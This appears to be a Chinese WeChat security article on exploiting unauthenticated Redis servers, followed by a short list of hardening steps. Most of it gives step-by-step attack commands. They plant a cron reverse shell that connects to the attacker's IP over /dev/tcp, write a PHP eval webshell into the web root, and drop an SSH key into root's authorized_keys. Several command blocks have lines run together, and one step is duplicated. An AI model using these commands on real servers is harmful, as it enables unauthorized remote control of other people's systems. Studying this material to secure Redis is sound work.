---
title: redis未授权
url: https://mp.weixin.qq.com/s/imE_-B-kbvxKX78ntzwJrg
source: Doonsec's feed
date: 2026-10-27
fetch_date: 2026-10-28T07:45:29.196999
---

# redis未授权

# redis未授权

原创

南棋子
南棋子

南棋子网络安全盟

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

# 漏洞核心原理

Redis默认配置（bind 0.0.0.0、protected-mode no、无requirepass）导致任意客户端可无密码连接。结合Redis的持久化机制（RDB快照、AOF日志）和动态配置功能（CONFIG SET），攻击者可修改数据存储路径和文件名，将恶意内容写入系统关键目录。

# 触发条件

Redis服务监听在公网或可被攻击者访问的IP（非仅127.0.0.1）。

未启用requirepass设置密码，或使用了弱口令。

Redis进程以root权限运行（写计划任务、SSH密钥需要高权限），或者Web目录/SSH目录对Redis用户可写。

开启了RDB持久化（默认开启），允许执行SAVE或BGSAVE。

# 漏洞成因

1. redis版本为4.x/5.0.5或以前的版本;
2. redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策
3. 略，直接暴露在公网;
4. 没有设置密码认证(一般为空)，可以免密码远程登录redis服务
5. Redis服务以高权限（如root）身份运行，具备读写关键目录（如Web服务工作目录、定时任务目录等）的能力

# 漏洞危害

攻击者可通过redis命令向目标服务器写入任务计划来反弹shell，完成服务器的控制。

攻击者可通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制;

最严重的情况，如果redis以root身份运行，黑客可以给root账户写入SSH公文件，直接通过SSH登录受害服务器。

# 漏洞利用

## 计划任务反弹shell

1.攻击机先监听端口

```
nc -lvnp 4444
```

2.连接目标 Redis

```
redis-cli -h 目标IP -p 6379
```

3.写入 payload（前后必须加换行\n\n，RDB 文件自带额外垃圾字节，不加换行 cron 识别失败）

```
set shell "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/攻击机IP/4444 0>&1\n\n"
```

4.修改备份目录、备份文件名

```
config set dir /var/spool/cronconfig set dbfilename rootSAVE
```

等待最多 1 分钟，cron 触发，拿到 shell

## Webshell利用

1.连接目标 Redis

```
redis-cli -h 目标IP -p 6379
```

2.写入一句话木马 key

```
set webshell "<?php @eval($_POST['cmd']);?>"
```

3.修改持久化目录为网站根目录，设置保存文件名（shell.php）

```
config set dir /var/www/htmlconfig set dbfilename shell.phpSAVE
```

4.访问 webshell 地址

```
http://目标IP/shell.php
```

然后用蚁剑 / 菜刀连接，密码是cmd

## 写SSH公钥实现SSH登录

1.攻击机生成 ssh 密钥

```
ssh-keygen -t rsa -N "" -f id_rsacat id_rsa.pub
```

2.连接目标 Redis

```
redis-cli -h 目标IP -p 6379
```

3.把公钥放进 redis 键值，前后加换行（重点！RDB 自带头部二进制垃圾，换行隔开，ssh 可以忽略前面脏数据）

```
set sshkey "\n\n这里粘贴你的id_rsa.pub内容\n\n"
```

4.修改持久化目录为 root 的.ssh 目录，文件名改为 authorized\_keys

```
set sshkey "\n\n这里粘贴你的id_rsa.pub内容\n\n"
```

5.修改持久化目录为 root 的.ssh 目录，文件名改为 authorized\_keys

```
config set dir /root/.sshconfig set dbfilename "authorized_keys"SAVE
```

6.攻击机直接 ssh 登录

```
ssh -i id_rsa root@目标IP
```

# 防御

1. 禁止 Redis 直接对公网监听
2. 身份认证：开启密码、ACL 权限控制
3. 禁用 / 重命名高危命令

```
rename-command CONFIG ""rename-command FLUSHALL ""rename-command FLUSHDB ""rename-command SHUTDOWN ""
```

4.禁止以 root 用户运行 Redis，单独创建 redis 低权限账号

5.升级到较新版本 Redis

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/eH2wZujxiaAGxWUtGnDHiaBAThibT6D6UQF2TbcBbAWWIs7v6ykKGIVdFiam7F186SKYZNxnW8WRJQDZHiaicvicH2D0Q/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过